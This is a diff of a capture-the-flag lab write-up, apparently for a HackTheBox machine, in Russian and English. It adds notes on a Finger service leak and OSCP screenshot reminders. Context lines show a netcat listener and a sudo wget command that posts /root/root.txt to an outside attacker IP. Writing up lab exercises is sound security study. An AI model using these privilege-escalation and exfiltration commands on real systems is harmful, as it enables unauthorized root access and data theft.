@@ -96,6 +96,8 @@ root@10.129.77.192: root     Super-User     pts/3     <Apr 24 10:37>     <PASSWO
 
 ## Первичный Доступ
 
+No CVE (custom vulnerability) - the Finger service on port 79 leaks a password hint in the Office Location field; combined with SSH on a non-standard port this grants initial access.
+
 ```bash
 ssh -p 22022 sunny@sunday.htb
 # Password: <PASSWORD>
@@ -108,6 +110,9 @@ sudo /root/troll
 # testing
 # uid=0(root) gid=0(root)
 ```
+
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
 
 Скрипт только печатает `id`. Root shell не даёт.
 
@@ -145,6 +150,9 @@ cat user.txt
 # <USER_FLAG>
 ```
 
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
+
 ---
 
 ## Повышение Привилегий
@@ -162,6 +170,9 @@ nc -lvnp 8000
 sudo wget --post-file=/root/root.txt http://10.10.14.160:8000/
 # <ROOT_FLAG>
 ```
+
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
 
 ### Полноценный root - подмена /etc/sudoers
 
